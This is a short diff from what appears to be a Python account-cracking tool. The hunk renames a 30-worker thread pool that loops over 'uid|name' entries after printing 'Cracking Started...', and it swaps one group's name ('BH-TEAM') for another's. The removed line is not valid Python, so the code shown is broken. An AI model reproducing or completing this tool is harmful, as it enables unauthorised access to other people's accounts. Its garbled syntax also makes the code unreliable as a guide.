@@ -237,7 +237,7 @@ class __xxx__:
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with BH-TEAM(max_workers=30) as BH-TEAM:
+            with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
